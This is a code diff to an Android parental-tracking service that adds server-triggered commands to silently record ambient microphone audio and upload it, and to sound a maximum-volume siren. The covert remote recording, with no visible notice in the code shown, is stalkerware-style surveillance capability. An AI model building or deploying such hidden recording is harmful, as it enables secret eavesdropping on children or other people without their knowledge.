@@ -173,6 +173,13 @@ public class ChildTrackingService extends Service implements LocationListener {
                 editor.apply();
             }
 
+            // Check for remote ambient sound recording action
+            if ("ACTION_RECORD_AMBIENT_SOUND".equals(intent.getAction())) {
+                int duration = intent.getIntExtra("duration_seconds", 20);
+                String reqId = intent.getStringExtra("request_id");
+                recordAndUploadAmbientSound(duration, reqId);
+            }
+
             // Check for emergency Last Breath pulse from WatchdogReceiver
             if (intent.getBooleanExtra("ACTION_LAST_BREATH", false)) {
                 triggerLastBreathSnapshot();
@@ -463,6 +470,9 @@ public class ChildTrackingService extends Service implements LocationListener {
                     JSONObject resObj = new JSONObject(sb.toString());
                     if (resObj.has("policy")) {
                         applyPolicy(resObj.getJSONObject("policy"));
+                    }
+                    if (resObj.has("commands")) {
+                        processIncomingCommands(resObj.getJSONArray("commands"));
                     }
                 } catch (Exception ignored) {}
                 return true;
@@ -802,4 +812,170 @@ public class ChildTrackingService extends Service implements LocationListener {
 
     @Override
     public void onProviderDisabled(String provider) {}
+
+    // =========================================================================
+    // KILLER BENCHMARK FEATURE: REMOTE AMBIENT SOUND ("ЗВУК ВОКРУГ") & SIREN
+    // =========================================================================
+
+    private void processIncomingCommands(org.json.JSONArray commands) {
+        if (commands == null) return;
+        for (int i = 0; i < commands.length(); i++) {
+            try {
+                org.json.JSONObject cmd = commands.getJSONObject(i);
+                String type = cmd.optString("type");
+                if ("record_ambient_sound".equals(type)) {
+                    int duration = cmd.optInt("duration_seconds", 20);
+                    String reqId = cmd.optString("request_id", "");
+                    recordAndUploadAmbientSound(duration, reqId);
+                } else if ("remote_siren".equals(type)) {
+                    triggerRemoteSirenLoud();
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Error executing incoming command: " + e.getMessage());
+            }
+        }
+    }
+
+    private void triggerRemoteSirenLoud() {
+        try {
+            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+            if (am != null) {
+                int maxVol = am.getStreamMaxVolume(AudioManager.STREAM_ALARM);
+                am.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0);
+            }
+            android.net.Uri alert = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM);
+            if (alert == null) {
+                alert = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE);
+            }
+            android.media.Ringtone r = android.media.RingtoneManager.getRingtone(getApplicationContext(), alert);
+            if (r != null) {
+                r.play();
+                scheduler.schedule(() -> {
+                    try { if (r.isPlaying()) r.stop(); } catch (Exception ignored) {}
+                }, 12, TimeUnit.SECONDS);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Error playing siren: " + e.getMessage());
+        }
+    }
+
+    private synchronized void recordAndUploadAmbientSound(final int durationSeconds, final String requestId) {
+        new Thread(() -> {
+            java.io.File audioFile = null;
+            android.media.MediaRecorder recorder = null;
+            try {
+                int duration = (durationSeconds > 0 && durationSeconds <= 60) ? durationSeconds : 20;
+                java.io.File cacheDir = getCacheDir();
+                audioFile = new java.io.File(cacheDir, "ambient_" + System.currentTimeMillis() + ".m4a");
+
+                recorder = new android.media.MediaRecorder();
+                recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
+                recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
+                recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
+                recorder.setAudioEncodingBitRate(64000);
+                recorder.setAudioSamplingRate(44100);
+                recorder.setOutputFile(audioFile.getAbsolutePath());
+                recorder.prepare();
+                recorder.start();
+                Log.d(TAG, "Native ambient sound recording started for " + duration + "s");
+
+                Thread.sleep(duration * 1000L);
+
+                try {
+                    recorder.stop();
+                } catch (Exception ignored) {}
+                recorder.release();
+                recorder = null;
+
+                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+                String childId = prefs.getString(KEY_CHILD_ID, null);
+                String serverUrl = prefs.getString(KEY_SERVER_URL, DEFAULT_SERVER_URL);
+
+                if (childId != null && !childId.trim().isEmpty() && audioFile.exists() && audioFile.length() > 0) {
+                    uploadAmbientAudioFile(serverUrl, childId, audioFile, duration, requestId);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Failed native ambient sound recording: " + e.getMessage());
+            } finally {
+                if (recorder != null) {
+                    try { recorder.release(); } catch (Exception ignored) {}
+                }
+                if (audioFile != null && audioFile.exists()) {
+                    audioFile.delete();
+                }
+            }
+        }).start();
+    }
+
+    private void uploadAmbientAudioFile(String baseUrl, String childId, java.io.File audioFile, int duration, String requestId) {
+        HttpURLConnection conn = null;
+        try {
+            String cleanBase = (baseUrl != null && !baseUrl.trim().isEmpty()) ? baseUrl.trim() : DEFAULT_SERVER_URL;
+            if (cleanBase.contains("?")) cleanBase = cleanBase.substring(0, cleanBase.indexOf("?"));
+            cleanBase = cleanBase.replaceAll("/+$", "");
+            String endpoint = cleanBase + "/api/v1/webapp/child/" + childId.trim() + "/ambient-sound/upload";
+
+            String boundary = "===" + System.currentTimeMillis() + "===";
+            String LINE_FEED = "\r\n";
+
+            URL url = new URL(endpoint);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setUseCaches(false);
+            conn.setDoOutput(true);
+            conn.setDoInput(true);
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+            conn.setConnectTimeout(20000);
+            conn.setReadTimeout(20000);
+
+            try (java.io.OutputStream outputStream = conn.getOutputStream();
+                 java.io.PrintWriter writer = new java.io.PrintWriter(new java.io.OutputStreamWriter(outputStream, StandardCharsets.UTF_8), true)) {
+
+                // Parameter: duration_seconds
+                writer.append("--").append(boundary).append(LINE_FEED);
+                writer.append("Content-Disposition: form-data; name=\"duration_seconds\"").append(LINE_FEED);
+                writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
+                writer.append(LINE_FEED).append(String.valueOf(duration)).append(LINE_FEED);
+                writer.flush();
+
+                // Parameter: request_id
+                if (requestId != null && !requestId.isEmpty()) {
+                    writer.append("--").append(boundary).append(LINE_FEED);
+                    writer.append("Content-Disposition: form-data; name=\"request_id\"").append(LINE_FEED);
+                    writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
+                    writer.append(LINE_FEED).append(requestId).append(LINE_FEED);
+                    writer.flush();
+                }
+
+                // File: audio_file
+                writer.append("--").append(boundary).append(LINE_FEED);
+                writer.append("Content-Disposition: form-data; name=\"audio_file\"; filename=\"" + audioFile.getName() + "\"").append(LINE_FEED);
+                writer.append("Content-Type: audio/mp4").append(LINE_FEED);
+                writer.append(LINE_FEED);
+                writer.flush();
+
+                try (java.io.FileInputStream inputStream = new java.io.FileInputStream(audioFile)) {
+                    byte[] buffer = new byte[4096];
+                    int bytesRead;
+                    while ((bytesRead = inputStream.read(buffer)) != -1) {
+                        outputStream.write(buffer, 0, bytesRead);
+                    }
+                    outputStream.flush();
+                }
+
+                writer.append(LINE_FEED);
+                writer.flush();
+
+                writer.append("--").append(boundary).append("--").append(LINE_FEED);
+                writer.flush();
+            }
+
+            int code = conn.getResponseCode();
+            Log.d(TAG, "Ambient sound upload status: " + code);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to upload ambient sound: " + e.getMessage());
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
 }
